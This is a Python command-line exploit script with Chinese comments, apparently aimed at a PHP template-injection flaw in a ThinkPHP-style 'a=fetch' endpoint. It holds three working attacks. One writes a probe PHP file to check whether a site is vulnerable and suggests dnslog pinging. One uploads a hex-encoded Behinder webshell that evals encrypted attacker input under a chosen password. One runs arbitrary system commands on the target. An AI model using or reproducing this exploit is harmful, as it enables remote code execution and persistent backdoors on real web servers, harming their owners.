# coding=UTF-8

import string
import random
import hashlib
import click
import requests

# 超时时间
_timeout = 10
# 全局cookie，默认为空
_cookie = {}

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}

def get_hash():
    """获取随机字符串"""
    letters = string.ascii_letters
    rand = ''.join(random.sample(letters, 10))
    hash = hashlib.md5(rand.encode()).hexdigest()
    return hash[0:9]

def get(url, encoding='UTF-8'):
    """GET请求发送报文"""
    try:
        html = requests.get(url, headers=default_headers, cookies=_cookie, timeout=_timeout)
        html = html.content.decode(encoding)
        return html.replace('\x00', '').strip()
    except Exception as e:
        return 'ERROR:' + str(e)

def check(url):
    """检测一个url是否存在漏洞"""
    hash = get_hash()
    url1 = url + "/?a=fetch&templateFile=public/index&prefix=%27%27&content=<php>file_put_contents('{0}.php','%3c%3f%70%68%70%20%65%63%68%6f%28%22{0}%22%29%3b%3f%3e')</php>".format(hash)
    get(url1)
    url2 = url + "/{0}.php".format(hash)
    html = get(url2)
    if requests.get(url2).status_code == 200 and hash in html:
        print("漏洞存在!")
    else:
        print('''未检测到漏洞, 请用 -c "ping xxx.dnslog.cn" 结合dnslog再进行尝试!''')

def behinder(url, password):
    """上传冰蝎马并返回调用地址，连接密码"""
    hash = get_hash()
    shell = "%3c%3f%70%68%70%0a%40%65%72%72%6f%72%5f%72%65%70%6f%72%74%69%6e%67%28%30%29%3b%0a%73%65%73%73%69%6f%6e%5f%73%74%61%72%74%28%29%3b%0a%69%66%20%28%69%73%73%65%74%28%24%5f%47%45%54%5b%5c%27{0}%5c%27%5d%29%29%0a%7b%0a%20%20%20%20%24%6b%65%79%3d%73%75%62%73%74%72%28%6d%64%35%28%75%6e%69%71%69%64%28%72%61%6e%64%28%29%29%29%2c%31%36%29%3b%0a%20%20%20%20%24%5f%53%45%53%53%49%4f%4e%5b%5c%27%6b%5c%27%5d%3d%24%6b%65%79%3b%0a%20%20%20%20%70%72%69%6e%74%20%24%6b%65%79%3b%0a%7d%0a%65%6c%73%65%0a%7b%0a%20%20%20%20%24%6b%65%79%3d%24%5f%53%45%53%53%49%4f%4e%5b%5c%27%6b%5c%27%5d%3b%0a%09%24%70%6f%73%74%3d%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%70%68%70%3a%2f%2f%69%6e%70%75%74%22%29%3b%0a%09%69%66%28%21%65%78%74%65%6e%73%69%6f%6e%5f%6c%6f%61%64%65%64%28%5c%27%6f%70%65%6e%73%73%6c%5c%27%29%29%0a%09%7b%0a%09%09%24%74%3d%22%62%61%73%65%36%34%5f%22%2e%22%64%65%63%6f%64%65%22%3b%0a%09%09%24%70%6f%73%74%3d%24%74%28%24%70%6f%73%74%2e%22%22%29%3b%0a%09%09%0a%09%09%66%6f%72%28%24%69%3d%30%3b%24%69%3c%73%74%72%6c%65%6e%28%24%70%6f%73%74%29%3b%24%69%25%32%42%25%32%42%29%20%7b%0a%20%20%20%20%09%09%09%20%24%70%6f%73%74%5b%24%69%5d%20%3d%20%24%70%6f%73%74%5b%24%69%5d%5e%24%6b%65%79%5b%24%69%25%32%42%31%26%31%35%5d%3b%20%0a%20%20%20%20%09%09%09%7d%0a%09%7d%0a%09%65%6c%73%65%0a%09%7b%0a%09%09%24%70%6f%73%74%3d%6f%70%65%6e%73%73%6c%5f%64%65%63%72%79%70%74%28%24%70%6f%73%74%2c%20%22%41%45%53%31%32%38%22%2c%20%24%6b%65%79%29%3b%0a%09%7d%0a%20%20%20%20%24%61%72%72%3d%65%78%70%6c%6f%64%65%28%5c%27%7c%5c%27%2c%24%70%6f%73%74%29%3b%0a%20%20%20%20%24%66%75%6e%63%3d%24%61%72%72%5b%30%5d%3b%0a%20%20%20%20%24%70%61%72%61%6d%73%3d%24%61%72%72%5b%31%5d%3b%0a%09%63%6c%61%73%73%20%43%7b%70%75%62%6c%69%63%20%66%75%6e%63%74%69%6f%6e%20%5f%5f%63%6f%6e%73%74%72%75%63%74%28%24%70%29%20%7b%65%76%61%6c%28%24%70%2e%22%22%29%3b%7d%7d%0a%09%40%6e%65%77%20%43%28%24%70%61%72%61%6d%73%29%3b%0a%7d%0a%3f%3e".format(password)
    url1 = url + "/?a=fetch&templateFile=public/index&prefix=%27%27&content=<php>file_put_contents('{0}.php','{1}')</php>".format(hash, shell)
    requests.get(url1)
    url2 = url + "/{0}.php".format(hash)
    r = requests.get(url2)
    if r.status_code == 200:
        print("冰蝎调用地址:{0}/{1}.php".format(url, hash)+"   连接密码是:{0}".format(password))
    else:
        print("上传失败!")

def execute(url, command):
    """直接执行任意命令,无回显"""
    hash = get_hash()
    url1 = url + r'''/?a=fetch&content=<?php%20system("{0}");?>{1}'''.format(command,hash)
    get(url1)

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-u', '--url', help="URL address for exploit")
@click.option('-p', '--password',help="password for behinder shell")
@click.option('-c', '--command',help="command execute, but no screen display")
def main(url, password, command):
    if url and not password and not command:
        check(url)
    if url and password and not command:
        behinder(url, password)
    if url and command and not password:
        execute(url, command)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        exit(0)
    except Exception as e:
        click.secho("[ERROR] {error}".format(error=e), fg='red')
        exit(0)